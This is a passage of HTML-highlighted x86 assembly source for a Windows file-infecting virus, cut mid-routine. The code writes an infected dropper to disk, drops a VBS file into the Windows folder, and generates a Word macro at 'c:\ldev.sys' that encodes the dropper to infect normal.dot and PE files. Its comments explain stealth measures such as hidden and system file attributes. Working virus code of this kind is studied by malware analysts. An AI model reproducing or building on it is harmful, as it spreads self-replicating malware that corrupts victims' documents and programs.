        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_WriteFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; close file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">infWord</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; disable word infection</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">; infect it</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">infWord</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; enable word infection</span><span class="sc0">

        </span><span class="sc1">; uhm. This is nice to not overload the system and to make</span><span class="sc0">
        </span><span class="sc1">; the virus algo more nice. Dropper will be infected with</span><span class="sc0">
        </span><span class="sc1">; wm infection disabled. When a DOC spawns this dropper only</span><span class="sc0">
        </span><span class="sc1">; PE files will be infected. Later, a infected PE file will</span><span class="sc0">
        </span><span class="sc1">; infect normal.dot.</span><span class="sc0">

</span><span class="sc5">skipSpawn</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mHnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; free tmp mem</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_UnmapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; now spawn vbs code</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAXSTRING</span><span class="sc0">                       </span><span class="sc1">; get windows directory</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">; again</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetWindowsDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">retHost</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">vbsfilename</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_lstrcat</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; spawn it to disk at '&lt;WINDOWS FOLDER&gt;/ldevwm.vbs'</span><span class="sc0">
        </span><span class="sc1">; This is the only one suspicious file that remains after</span><span class="sc0">
        </span><span class="sc1">; the spawns. ldev.sys, ldevrtl.dll and ldev.exe (system and</span><span class="sc0">
        </span><span class="sc1">; hidden attributes) are more stealthy.</span><span class="sc0">
        </span><span class="sc1">; I thought to delete it after wm infection, but vbs execution</span><span class="sc0">
        </span><span class="sc1">; it's kinda slow... and gives some problems if we try to</span><span class="sc0">
        </span><span class="sc1">; delete it in a bad time. So it remains there.</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000080h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40000000h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CreateFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">retHost</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; save file handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">; write it all</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">address</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; shit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">vbsdroplen</span><span class="sc0">                      </span><span class="sc1">; size        </span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">vbsdrop</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; buffer to write</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_WriteFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; close file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; now generate macro at 'c:\ldev.sys'</span><span class="sc0">
        </span><span class="sc1">; 1st open the infected dropper</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000080h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000003h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000000h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CreateFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; open the file R</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">retHost</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetFileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get file size</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">dropMacroErrorClose</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CreateFileMappingA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; file mapping</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">dropMacroErrorClose</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhmap</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhmap</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_MapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; map a view</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">dropMacroErrorCloseMap</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapMem</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; 2nd open the file to build macro</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000080h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40000000h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">macrofilename</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CreateFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">dropMacroErrorCloseUnmap</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; write pre-built part</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">; write it all</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">address</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; shit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">wordmacrolen</span><span class="sc0">                    </span><span class="sc1">; size        </span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">wordmacro</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; buffer to write</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_WriteFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">presub</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc12">'a'</span><span class="sc0">    </span><span class="sc1">; fix subs</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; calc how many subs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">                          </span><span class="sc1">; div 512</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">notReminder</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">notReminder</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">genCallSubs</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; gen subs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0a0dh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">genCallSubs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; write it</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">; write it all</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">address</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; shit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; size        </span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">buffer0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; buffer to write</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_WriteFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; write end of main sub drop</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">; write it all</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">address</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; shit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">closedus</span><span class="sc0">                        </span><span class="sc1">; size        </span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">closedu</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; buffer to write</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_WriteFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; encode the dropper inside the macro</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; number of subs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">buffer0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapMem</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">macroEncodeLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">presub</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                  </span><span class="sc1">; sub line</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mlstrcpy</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">            </span><span class="sc1">; increse letter</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">nEncLines</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">letlin</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                  </span><span class="sc1">; begining of enc line</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mlstrcpy</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapMem</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
